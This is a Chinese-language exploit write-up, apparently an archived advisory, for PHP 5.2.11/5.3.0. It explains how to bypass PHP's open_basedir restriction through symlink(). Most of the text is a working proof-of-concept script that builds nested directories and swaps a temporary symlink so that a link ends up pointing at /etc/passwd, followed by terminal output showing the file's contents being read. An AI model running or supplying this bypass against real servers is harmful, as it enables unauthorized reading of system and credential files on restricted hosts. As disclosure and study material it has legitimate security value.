### PHP 5.2.11/5.3.0 - Multiple Vulnerabilities
---
symlink()函数在php中用于创建符号连接，函数原型如下：

```
bool symlink ( string $target , string $link )
```

其中$target和$link参数会受到open_basedir的限制，但是可以通过以下的方法来进行绕过。

首先来看被限制的情况

```
<?php
//sym.php
symlink("/etc/passwd", "./symlink");
?>
```

执行php sym.php返回如下

```
PHP Warning: symlink(): open_basedir restriction in effect. File(/etc/passwd) is not within the allowed path(s): (/www) in /www/test/sym.php on line 2

Warning: symlink(): open_basedir restriction in effect. File(/etc/passwd) is not within the allowed path(s): (/www) in /www/test/sym.php on line 2
```
open_basedir会禁止连接到/etc/passwd

但是可以试着构造以下的情况,

来看下当前目录情况

```
127# ls -la
total 8
drwxr-xr-x 2 www www 512 Oct 20 00:33 .
drwxr-xr-x 13 www www 1536 Oct 20 00:26 ..
- -rw-r--r-- 1 www www 356 Oct 20 00:32 kakao.php
- -rw-r--r-- 1 www www 45 Oct 20 00:26 sym.php
127# pwd
/www/test
```

其中kakao.php代码如下：

```
<?php
mkdir("abc");
chdir("abc");
mkdir("etc");
chdir("etc");
mkdir("passwd");
chdir("..");
mkdir("abc");
chdir("abc");
mkdir("abc");
chdir("abc");
mkdir("abc");
chdir("abc");
chdir("..");
chdir("..");
chdir("..");
chdir("..");
symlink("abc/abc/abc/abc","tmplink");
symlink("tmplink/../../../etc/passwd", "exploit");
unlink("tmplink");
mkdir("tmplink");
?>
```

这个时候对于symlink来说参数都是合法的。

执行php kakao.php，再查看当前目录

```
127# php kakao.php
127# ls -la
total 12
drwxr-xr-x 4 www www 512 Oct 20 00:37 .
drwxr-xr-x 13 www www 1536 Oct 20 00:26 ..
drwxr-xr-x 4 www www 512 Oct 20 00:37 abc
lrwxr-xr-x 1 www www 27 Oct 20 00:37 exploit -> tmplink/../../../etc/passwd
- -rw-r--r-- 1 www www 356 Oct 20 00:32 kakao.php
- -rw-r--r-- 1 www www 45 Oct 20 00:26 sym.php
drwxr-xr-x 2 www www 512 Oct 20 00:37 tmplink
```

这个时候再来看下exploit文件中的内容

```
127# cat exploit
root:*:0:0:god:/root:/bin/csh
...
...
```

已经成功把/etc/passwd中的内容显示出来了

现在的tmplink是个文件夹，所以链接"exploit"变成了"../../etc/passwd"，成功绕开了symlink()中open_basedir对参数的检查。